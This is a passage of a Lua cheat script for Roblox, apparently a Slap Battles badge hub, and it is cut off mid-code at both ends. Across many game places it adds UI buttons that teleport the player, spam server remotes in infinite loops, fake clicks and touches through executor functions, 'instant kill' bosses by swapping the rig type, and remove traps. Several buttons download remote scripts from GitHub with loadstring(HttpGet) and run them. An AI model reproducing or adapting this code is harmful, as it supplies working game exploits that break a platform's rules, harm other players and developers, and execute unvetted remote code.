                Content = "Not Enough Money",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end

    local purplePositions = {
        {41, 11, -15},
        {42, 11, -12},
        {42, 11, -9},
        {43, 11, -4},
        {45, 11, 1},
        {46, 11, 6},
        {46, 11, 10},
        {47, 11, 15}
    }

    for i, pos in ipairs(purplePositions) do
        Tab:AddButton({
            Name = "Spawn " .. i,
            Callback = function()
                spawnPurpleDefence(120, pos)
            end
        })
    end

    -- 🔟 Ten Section
    Tab:AddSection({ Name = "Spawn Ten" })

    local function spawnTenDefence(cost, position)
        local goldText = game.Players.LocalPlayer.PlayerGui.TowerDefenceUI.Gold.Text
        local gold = tonumber(goldText:match("%d+"))

        if gold and gold >= cost then
            local args = {
                [1] = "PlaceDefence",
                [2] = {
                    ["cf"] = CFrame.new(unpack(position)),
                    ["defencename"] = "Defence3"
                }
            }
            game:GetService("ReplicatedStorage").TowerDefenceAssets.TD_Event:FireServer(unpack(args))
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Not Enough Money",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end

    local tenPositions = {
        {26, 11, -21},
        {30, 11, -22},
        {34, 11, -22},
        {40, 11, -24},
        {45, 11, -24},
        {51, 11, -26}
    }

    for i, pos in ipairs(tenPositions) do
        Tab:AddButton({
            Name = "Spawn " .. i,
            Callback = function()
                spawnTenDefence(450, pos)
            end
        })
    end

end

if game.PlaceId == 97220865182663 then -- The Home of The Rat King
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Badges",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    -- Section: Teleport
    Tab:AddSection({ Name = "Teleport" })

    Tab:AddDropdown({
        Name = "Teleport",
        Default = "",
        Options = {"Main", "NPC"},
        Callback = function(Value)
            if Value == "Main" then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(3, 41, -59)
            elseif Value == "NPC" then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4, 41, 54)
            end
        end
    })

    -- Section: Mouse Glove
    Tab:AddSection({ Name = "For Mouse Glove" })

    Tab:AddButton({
        Name = "Kill Mouses (Click Many Times)",
        Callback = function()
            -- WARNING: Infinite loop — make sure to add a stop key in real usage
            while true do
                local args = {
                    [1] = workspace.Game.Enemies.Rat.Hitbox
                }
                game:GetService("ReplicatedStorage").Remotes.GloveHit:FireServer(unpack(args))
                task.wait()
            end
        end
    })

    Tab:AddButton({
        Name = "Spawn Tree",
        Callback = function()
            local args = {
                [1] = "Farm",
                [2] = Vector3.new(8.000056, 43.746284, -68.000213),
                [3] = 0
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("PlaceBuilding"):FireServer(unpack(args))
        end
    })

    Tab:AddButton({
        Name = "Auto Hit Tree",
        Callback = function()
            -- WARNING: Infinite loop — stop key recommended
            while true do
                local args = {
                    [1] = workspace:WaitForChild("Game"):WaitForChild("Buildings"):WaitForChild("Farm"):WaitForChild("Farm"):WaitForChild("Hitbox")
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("GloveHit"):FireServer(unpack(args))
                task.wait()
            end
        end
    })

end

if game.PlaceId == 98726100529621 then -- The White Place
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    -- Create tab
    local Tab = Window:MakeTab({
        Name = "Badges",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    -- Add section
    Tab:AddSection({ Name = "Hexa Glove" })

    -- Notification
    OrionLib:MakeNotification({
        Name = "Scripter",
        Content = "Good luck :)",
        Image = "rbxassetid://4483345998",
        Time = 3
    })

    -- Button: Auto Get Hexa Glove
    Tab:AddButton({
        Name = "Auto Get Hexa Glove",
        Callback = function()
            local player = game.Players.LocalPlayer
            local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")

            repeat task.wait(0.2) until workspace:FindFirstChild("Part I") and hrp
            task.wait(5)
            workspace["Part I"].Obby["end"].CFrame = hrp.CFrame

            repeat task.wait(0.2) until workspace:FindFirstChild("Part 2") and hrp
            task.wait(5)
            workspace["Part 2"]["Adjacent Island"].PortalActivator.CanCollide = false
            workspace["Part 2"]["Adjacent Island"].PortalActivator.CFrame = hrp.CFrame

            repeat task.wait(0.1) until workspace["Part 2"]:FindFirstChild("Portal")
            workspace["Part 2"].Portal.CanCollide = false
            workspace["Part 2"].Portal.CFrame = hrp.CFrame

            repeat task.wait(0.2) until workspace:FindFirstChild("Part 3") and hrp
            task.wait(5)
            fireclickdetector(workspace["Part 3"].TpToNext.HitBox.Click)

            repeat task.wait(0.2) until workspace:FindFirstChild("Part 4") and hrp
            task.wait(5)
            workspace["Part 4"].TPPart.CFrame = hrp.CFrame

            repeat task.wait(0.2) until workspace:FindFirstChild("Part 5") and hrp
            task.wait(5)
            fireclickdetector(workspace["Part 5"].Glove.Hitbox.Click)

            repeat task.wait(0.2) until workspace:FindFirstChild("Finale") and hrp
            task.wait(5)
            fireclickdetector(workspace.Finale.Reward.Hitbox.Click)
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 136005148166028 then -- Day in The Life of a Small Roblox Developer
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Badges",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    -- Metaverse Glove Automation
    Tab:AddButton({
        Name = "Get Metaverse Glove",
        Callback = function()

            -- Handle other games if teleported
            if game.PlaceId == 6403373529 then
                firetouchinterest(game.Players.LocalPlayer.Character.Head, workspace.Lobby.brazil.portal, 0)
                return
            elseif game.PlaceId == 7234087065 then
                firetouchinterest(game.Players.LocalPlayer.Character.Head, workspace.Buildings["wizard twoer 2"].Model.Trigger, 0)
                return
            end

            -- Helper Functions
            local function fireTouch(part)
                if part:FindFirstChild("TouchInterest") then
                    firetouchinterest(game.Players.LocalPlayer.Character.Head, part, 0)
                    firetouchinterest(game.Players.LocalPlayer.Character.Head, part, 1)
                else
                    print(part.Name .. " can't be touched")
                end
            end

            local function fireClick(part)
                if part:FindFirstChild("ClickDetector") then
                    fireclickdetector(part.ClickDetector)
                else
                    print(part.Name .. " can't be clicked")
                end
            end

            local function bringToPlayer(part)
                local originalCFrame = part.CFrame
                part.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                task.wait(0.5)
                part.CFrame = originalCFrame
            end

            -- Sequence Begins
            bringToPlayer(workspace.Stages.Stage2.CloseBasementDoor)
            task.wait(0.1)

            fireClick(workspace.Kitchen.Fridge.HitBox)
            task.wait(1)

            fireClick(workspace.Kitchen.Fridge.GrantAward)
            task.wait(0.5)

            fireClick(workspace.Microwave.HitBox)
            task.wait(1)

            -- Wait for tool to be given (Microwave reward)
            local tool = nil
            game.Players.LocalPlayer.Character.ChildAdded:Connect(function(v)
                if v:IsA("Tool") then tool = v end
            end)
            game.Players.LocalPlayer.Backpack.ChildAdded:Connect(function(v)
                if v:IsA("Tool") then tool = v end
            end)

            repeat
                fireClick(workspace.Microwave.HitBox)
                task.wait(1)
            until tool

            -- Equip and activate the tool
            tool.Parent = game.Players.LocalPlayer.Character
            task.wait(0.5)
            tool:Activate()
            task.wait(3)

            -- Final microwave click
            fireClick(workspace.Microwave.HitBox)
            task.wait(3)

            -- Reveal the table with hint
            bringToPlayer(workspace.RevealTableHint)
            task.wait(2)

            fireTouch(workspace.BasementTable.HitBox)
            task.wait(3)

            -- Reset basement door to original position
            bringToPlayer(workspace.Stages.Stage2.CloseBasementDoor)
            task.wait(2)

            -- Fire final server event to complete
            local args = { [1] = "Victory" }
            game:GetService("ReplicatedStorage").Remotes.ComputerState:FireServer(unpack(args))
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 117232463555132 then -- Sword Fight on The Heights
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Badges",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    -- 📍 Teleport to Spawn
    Tab:AddButton({
        Name = "Teleport To Spawn",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-6, 596, 66)
        end
    })

    -- 🧟 Teleport to Boss
    Tab:AddButton({
        Name = "Teleport To Boss",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-7, 845, 59)
        end
    })

    -- ⚔️ Instant Kill Boss (Force R15 to break it)
    Tab:AddButton({
        Name = "Instant Kill Boss",
        Callback = function()
            local boss = workspace:FindFirstChild("Map")
                and workspace.Map:FindFirstChild("Components")
                and workspace.Map.Components:FindFirstChild("NPCs")
                and workspace.Map.Components.NPCs:FindFirstChild("FinalBoss")
                and workspace.Map.Components.NPCs.FinalBoss:FindFirstChild("FinalBoss")
                and workspace.Map.Components.NPCs.FinalBoss.FinalBoss:FindFirstChild("Humanoid")
            
            if boss then
                boss.RigType = Enum.HumanoidRigType.R15
            else
                OrionLib:MakeNotification({
                    Name = "Error",
                    Content = "Final Boss not found.",
                    Image = "rbxassetid://7743878857",
                    Time = 3
                })
            end
        end
    })

    -- 🏁 Teleport to Finish Line
    Tab:AddButton({
        Name = "Teleport To Finish",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-6, 845, 281)
        end
    })

    -- 🏠 Teleport Back to Lobby
    Tab:AddButton({
        Name = "Teleport To Lobby",
        Callback = function()
            game:GetService("TeleportService"):Teleport(6403373529) -- Assuming this is the lobby game's PlaceId
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 129665246576996 then -- Epilson Lorem Ipsum
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Badges",
        Icon = "rbxassetid://7733673987",
        PremiumOnly = false
    })

    Tab:AddButton({
        Name = "Auto Get Eggler Glove",
        Callback = function()
            loadstring(game:HttpGet("https://github.com/kizzysigma/Slap-Battles/raw/refs/heads/main/sigma%20male%20eggler"))()
        end
    })

    Tab:AddLabel("Credits to: Kizzy")

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 132277598079047 then -- Collect My Pages
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    OrionLib:MakeNotification({
        Name = "From Scripter",
        Content = "GoodLuck!",
        Image = "rbxassetid://7734059095",
        Time = 3
    })

    local Tab = Window:MakeTab({
        Name = "Main",
        Icon = "rbxassetid://7733960981",
        PremiumOnly = false
    })

    Tab:AddButton({
        Name = "Teleport To All 8 Pages",
        Callback = function()
            local pages = game.workspace.Pages:GetChildren()
            
            -- Set HoldDuration to 0 for all 8 pages
            for i = 1, 8 do
                local page = pages[i]
                if page and page:FindFirstChild("Part") and page.Part:FindFirstChild("ProximityPrompt") then
                    page.Part.ProximityPrompt.HoldDuration = 0
                    task.wait(0.1)
                end
            end
            
            -- Teleport sequence to pages' positions
            local positions = {
                Vector3.new(26, 0, 240),
                Vector3.new(146, -3, 13),
                Vector3.new(-58, -2, 136),
                Vector3.new(88, 0, -70),
                Vector3.new(-129, 2, 74),
                Vector3.new(100, 12, -70),
                Vector3.new(42, 29, 248),
                Vector3.new(78, 0, 146),
            }
            
            for _, pos in ipairs(positions) do
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
                task.wait(1)
            end
        end
    })

    Tab:AddButton({
        Name = "Kill Slender",
        Callback = function()
            local slender = game.workspace:FindFirstChild("Slender")
            if slender and slender:FindFirstChild("Humanoid") then
                slender.Humanoid.RigType = "R15"
            end
        end
    })

    Tab:AddToggle({
        Name = "Full Bright",
        Default = false,
        Callback = function(Value)
            local Lighting = game:GetService("Lighting")
            if Value then
                Lighting.Brightness = 10
                Lighting.ClockTime = 12
                Lighting.FogEnd = 10000
                Lighting.GlobalShadows = true
                Lighting.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
            else
                Lighting.Brightness = 2
                Lighting.ClockTime = 14
                Lighting.FogEnd = 100000
                Lighting.GlobalShadows = false
                Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
            end
        end
    })

    Tab:AddButton({
        Name = "Enable Camera (use ;thirdp)",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        end
    })

    Tab:AddToggle({
        Name = "Page ESP",
        Default = false,
        Callback = function(Value)
            local PageESP = Value

            if not PageESP then
                for _, v in pairs(workspace:GetDescendants()) do
                    if v:IsA("BillboardGui") and v.Name == "PageESP" then
                        v:Destroy()
                    end
                end
                return
            end

            task.spawn(function()
                while PageESP do
                    local lp = game.Players.LocalPlayer
                    local char = lp.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    if not hrp then
                        task.wait(0.5)
                        continue
                    end

                    local targetParts = {}

                    -- Add explicit Pages.Page.Part
                    local pagesFolder = workspace:FindFirstChild("Pages")
                    if pagesFolder then
                        local page = pagesFolder:FindFirstChild("Page")
                        if page and page:FindFirstChild("Part") then
                            table.insert(targetParts, page.Part)
                        end
                        local children = pagesFolder:GetChildren()
                        for i = 2, 8 do
                            local child = children[i]
                            if child and child:FindFirstChild("Part") then
                                table.insert(targetParts, child.Part)
                            end
                        end
                    end

                    for _, part in ipairs(targetParts) do
                        if not part:FindFirstChild("PageESP") then
                            local esp = Instance.new("BillboardGui")
                            esp.Name = "PageESP"
                            esp.Adornee = part
                            esp.Size = UDim2.new(0, 150, 0, 40)
                            esp.StudsOffset = Vector3.new(0, 2, 0)
                            esp.AlwaysOnTop = true
                            esp.Parent = part

                            local label = Instance.new("TextLabel", esp)
                            label.BackgroundTransparency = 1
                            label.Size = UDim2.new(1, 0, 1, 0)
                            label.TextSize = 16
                            label.Font = Enum.Font.FredokaOne
                            label.TextColor3 = Color3.fromRGB(255, 255, 255)
                            label.TextStrokeTransparency = 0.2
                            label.Text = "Page"
                        end

                        local gui = part:FindFirstChild("PageESP")
                        local label = gui and gui:FindFirstChildOfClass("TextLabel")
                        if label then
                            local dist = math.floor((part.Position - hrp.Position).Magnitude)
                            label.Text = "Page | " .. dist .. "m"
                        end
                    end

                    task.wait(0.5)
                end
            end)
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 136690395520488 then -- Friday the 13th
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Main",
        Icon = "rbxassetid://7734053426",
        PremiumOnly = false
    })

    Section = Tab:AddSection({
        Name = "Light Settings"
    })

    Tab:AddToggle({
        Name = "Full Bright",
        Default = false,
        Callback = function(Value)
            local Lighting = game:GetService("Lighting")
            if Value then
                Lighting.Brightness = 10
                Lighting.ClockTime = 12
                Lighting.FogEnd = 10000
                Lighting.GlobalShadows = true
                Lighting.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
            else
                Lighting.Brightness = 2
                Lighting.ClockTime = 14
                Lighting.FogEnd = 100000
                Lighting.GlobalShadows = false
                Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
            end
        end
    })

    Tab:AddButton({
        Name = "Enable Camera (use ;thirdp)",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        end
    })

    Tab:AddButton({
        Name = "Remove Blood Fog",
        Callback = function()
            local bloodMoonSky = game:GetService("Lighting"):FindFirstChild("The Blood Moon sky")
            if bloodMoonSky then
                bloodMoonSky:Destroy()
            end
        end
    })

    -- Variables to store slider values
    local selectedBrightness = 0
    local selectedRange = 0

    -- Sliders
    Tab:AddSlider({
        Name = "Lantern Brightness",
        Min = 0,
        Max = 10,
        Default = 0,
        Increment = 1,
        ValueName = "Brightness",
        Callback = function(Value)
            selectedBrightness = Value
        end
    })

    Tab:AddSlider({
        Name = "Lantern Range",
        Min = 0,
        Max = 60,
        Default = 0,
        Increment = 1,
        ValueName = "Range",
        Callback = function(Value)
            selectedRange = Value
        end
    })

    -- Apply Button
    Tab:AddButton({
        Name = "Apply Lantern Settings",
        Callback = function()
            local player = game:GetService("Players").LocalPlayer
            local backpack = player:FindFirstChild("Backpack")
            local lantern = backpack and backpack:FindFirstChild("Lantern")
            local handle = lantern and lantern:FindFirstChild("Handle")
            local fire = handle and handle:FindFirstChild("Fire")
            local pointLight = fire and fire:FindFirstChild("PointLight")

            if pointLight then
                pointLight.Brightness = selectedBrightness
                pointLight.Range = selectedRange

                OrionLib:MakeNotification({
                    Name = "Lantern Updated",
                    Content = "Brightness set to " .. selectedBrightness .. ", Range set to " .. selectedRange,
                    Image = "rbxassetid://7733715400",
                    Time = 2
                })
            else
                OrionLib:MakeNotification({
                    Name = "Lantern Not Found",
                    Content = "Unable to find Lantern in Backpack.",
                    Image = "rbxassetid://7733715400",
                    Time = 2
                })
            end
        end
    })

    Section = Tab:AddSection({
        Name = "Equip Settings"
    })

    local plantsFolder = workspace.Map.PuzzleStuff.ButtonPlants

    Tab:AddButton({
        Name = "Click Plant 1",
        Callback = function()
            fireclickdetector(plantsFolder.Plant.Hitbox.ClickDetector)
        end
    })

    Tab:AddButton({
        Name = "Click Plant 2",
        Callback = function()
            fireclickdetector(plantsFolder:GetChildren()[2].Hitbox.ClickDetector)
        end
    })

    Tab:AddButton({
        Name = "Click Plant 3",
        Callback = function()
            fireclickdetector(plantsFolder:GetChildren()[3].Hitbox.ClickDetector)
        end
    })

    Tab:AddButton({
        Name = "Click Plant 4",
        Callback = function()
            fireclickdetector(plantsFolder:GetChildren()[4].Hitbox.ClickDetector)
        end
    })

    Tab:AddButton({
        Name = "Click Plant 5",
        Callback = function()
            fireclickdetector(plantsFolder:GetChildren()[5].Hitbox.ClickDetector)
        end
    })

    Tab:AddButton({
        Name = "Click Plant 6",
        Callback = function()
            fireclickdetector(plantsFolder:GetChildren()[6].Hitbox.ClickDetector)
        end
    })

    Tab:AddButton({
        Name = "Equip Shovel",
        Callback = function()
            fireclickdetector(workspace.Map.PuzzleStuff.ShovelChest.Hitbox.ClickDetector)
        end
    })

    Tab:AddButton({
        Name = "Equip Sledge Hammer",
        Callback = function()
            fireclickdetector(workspace.Map.PuzzleStuff.Sledgehammer.Hitbox.ClickDetector)
        end
    })

    Section = Tab:AddSection({
        Name = "Puzzle Settings"
    })

    local targetRotation = Vector3.new(0.005, 10.758, 0)
    local puzzleRunning = false

    Section:AddToggle({
        Name = "Auto Solve Painting Puzzle",
        Default = false,
        Callback = function(Value)
            puzzleRunning = Value
            if not Value then return end

            task.spawn(function()
                while puzzleRunning do
                    local map = workspace:FindFirstChild("Map")
                    local puzzleStuff = map and map:FindFirstChild("PuzzleStuff")
                    local rotatedPaintings = puzzleStuff and puzzleStuff:FindFirstChild("RotatedPaintings")

                    if rotatedPaintings then
                        local painting1 = rotatedPaintings:FindFirstChild("Painting")
                        local painting2 = rotatedPaintings:GetChildren()[2]
                        local painting3 = rotatedPaintings:GetChildren()[3]
                        local painting4 = rotatedPaintings:GetChildren()[4]

                        local allCorrect =
                            painting1 and painting1.Rotation == targetRotation and
                            painting2 and painting2.Rotation == targetRotation and
                            painting3 and painting3.Rotation == targetRotation and
                            painting4 and painting4.Rotation == targetRotation

                        if allCorrect then
                            OrionLib:MakeNotification({
                                Name = "Puzzle Solved",
                                Content = "All paintings are in correct rotation.",
                                Image = "rbxassetid://7733715400",
                                Time = 3
                            })
                            break
                        end

                        local paintings = {painting1, painting2, painting3, painting4}
                        for _, painting in ipairs(paintings) do
                            if painting then
                                local detector = painting:FindFirstChildOfClass("ClickDetector")
                                if detector then
                                    fireclickdetector(detector)
                                    task.wait(0.1)
                                end
                            end
                        end
                    end
                    task.wait(0.2)
                end
            end)
        end
    })

    Section = Tab:AddSection({
        Name = "Boss Settings"
    })

    Tab:AddButton({
        Name = "Instant Kill Boss",
        Callback = function()
            local rig = workspace:FindFirstChild("Rig")
            if rig and rig:FindFirstChild("Humanoid") then
                rig.Humanoid.RigType = "R15"
            end
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 86045914443715 then -- Slap Cart
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Main",
        Icon = "rbxassetid://7734053426",
        PremiumOnly = false
    })

    Section = Tab:AddSection({
        Name = "Fly Script"
    })

    Tab:AddButton({
        Name = "Infinite Yield (Use ;fly)",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        end
    })

    Section = Tab:AddSection({
        Name = "Anti"
    })

    Tab:AddButton({
        Name = "Remove All Traps",
        Callback = function()
local racetrack = workspace.Map.Racetrack

-- Destroy all MEGAROCK models
for _, obj in pairs(racetrack:GetDescendants()) do
    if obj:IsA("Model") and obj.Name == "MEGAROCK" then
        obj:Destroy()
    end
end

-- Destroy all AxeTrap models
for _, obj in pairs(racetrack:GetDescendants()) do
    if obj:IsA("Model") and obj.Name == "AxeTrap" then
        obj:Destroy()
    end
end
        end
    })

Tab:AddParagraph("What Type Of Trap Removes?", [[
Spinner Megarocks
Spinner Scythes
]])

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 89837553336708 then -- The Suction Trials
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Main",
        Icon = "rbxassetid://7734053426",
        PremiumOnly = false
    })

    Section = Tab:AddSection({
        Name = "Instant"
    })

Tab:AddButton({
        Name = "Instant Win",
        Callback = function()
fireclickdetector(workspace["plunger glove"].ClickDetector)
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 75803343514634 then -- Shattered Reality
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Main",
        Icon = "rbxassetid://7734053426",
        PremiumOnly = false
    })

    Section = Tab:AddSection({
        Name = "Teleports"
    })

    Tab:AddButton({
        Name = "Teleport To Normal Portal (Stage 1)",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Stage1.Lobby.Portals.normal.Teleport1.CFrame
        end
    })

    Tab:AddButton({
        Name = "Teleport To Normal Portal (Stage 2)",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Stage2.Lobby.Portals.normal.Teleport1.CFrame
        end
    })

    Tab:AddButton({
        Name = "Teleport To Normal Portal (Stage 3)",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Stage3.Lobby.Portals.default.Teleport2.CFrame
        end
    })

    Tab:AddButton({
        Name = "Teleport To Dark Portal (Stage 1)",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Stage1.Mirror.Part.CFrame
        end
    })

    Tab:AddButton({
        Name = "Teleport To Dark Portal (Stage 2)",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Stage2.Mirror.Part.CFrame
        end
    })

    Section = Tab:AddSection({
        Name = "NPC"
    })

    Tab:AddButton({
        Name = "Instant Kill All Small Shadow NPC's",
        Callback = function()
            for _, model in pairs(workspace:GetDescendants()) do
    if model:IsA("Model") and model.Name:lower():find("shadow_npc") then
        local humanoid = model:FindFirstChildOfClass("Humanoid")
        if humanoid then
            pcall(function()
                humanoid.RigType = Enum.HumanoidRigType.R15
            end)
        end
    end
end
        end
    })

    Tab:AddButton({
        Name = "Instant Kill Boss Shadow NPC R15 (Damage Him 2 Times Before Doing)",
        Callback = function()
            workspace.Rig.Humanoid.Health = 1
            workspace.Rig.Humanoid.MaxHealth = 1
            workspace.Rig.Humanoid.RigType = "R15"
        end
    })

    Tab:AddButton({
        Name = "Instant Kill Boss Shadow NPC R6 (Damage Him 2 Times Before Doing)",
        Callback = function()
            workspace.Rig.Humanoid.Health = 1
            workspace.Rig.Humanoid.MaxHealth = 1
            workspace.Rig.Humanoid.RigType = "R6"
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 80420091630966 then -- Evil Barzil
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

    local Tab = Window:MakeTab({
        Name = "Main-Dave",
        Icon = "rbxassetid://7734053426",
        PremiumOnly = false
    })

    -- Items Section
    Section = Tab:AddSection({
        Name = "1 Stage"
    })

    Tab:AddButton({
        Name = "Teleport To Key",
        Callback = function()
            local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function teleportToRealKey()
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("Tool") and obj.Name == "Key" and obj.CanBeDropped == false then
            local handle = obj:FindFirstChild("Handle")
            if handle and handle:IsA("BasePart") then
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    LocalPlayer.Character.HumanoidRootPart.CFrame = handle.CFrame + Vector3.new(0, 3, 0)
                    print("Teleported to real Key.")
                    return
                end
            end
        end
    end
    warn("Real Key not found.")
end

-- Call the function to teleport
teleportToRealKey()
        end
    })

    Tab:AddButton({
        Name = "Teleport To Gate",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(211, 15, -78)
        end
    })

    Tab:AddButton({
        Name = "Teleport To Cyan Portal",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.TheOutside.TowerENT1.teleport.CFrame
        end
    })

    -- Items Section
    Section = Tab:AddSection({
        Name = "2 Stage"
    })

    Tab:AddButton({
        Name = "Teleport To Stepladder",
        Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Stepladder.Handle.CFrame
        end
    })

    Tab:AddButton({
        Name = "Teleport To Screwdriver",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Screwdriver.CFrame
        end
    })

    Tab:AddButton({
        Name = "Teleport To Broken Thing",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2202, 73, 42)
        end
    })

    Tab:AddButton({
        Name = "Teleport To Elevator",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2201, 61, 35)
        end
    })

    -- Items Section
    Section = Tab:AddSection({
        Name = "3 Stage"
    })

    Tab:AddButton({
        Name = "Teleport To Small Hammer/Large Hammer",
        Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4975, 5321, -196)
        end
    })

    Tab:AddButton({
        Name = "Teleport To Locked Door",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4974, 5321, -535)
        end
    })

    Tab:AddButton({
        Name = "Teleport To Window",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4772, 5321, -352)
        end
    })

    Tab:AddButton({
        Name = "Teleport To Boss Fight",
        Callback = function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4766, 5549, -349)
        end
    })

    Section = Tab:AddSection({
        Name = "Boss Stage"
    })

Tab:AddButton({
	Name = "Escape Rope (Jumps 5 Times)",
	Callback = function()
		local player = game.Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
		local humanoid = character:WaitForChild("Humanoid")

		for i = 1, 5 do
			humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
			wait(0.1) -- delay between jumps
		end
	end    
})

Tab:AddButton({
	Name = "Auto Set Proximity Prompt (0 Sec CD)",
	Callback = function()
while true do
-- Loop through all descendants of the workspace
for _, descendant in pairs(workspace:GetDescendants()) do
    -- Check if the descendant is a ProximityPrompt
    if descendant:IsA("ProximityPrompt") then
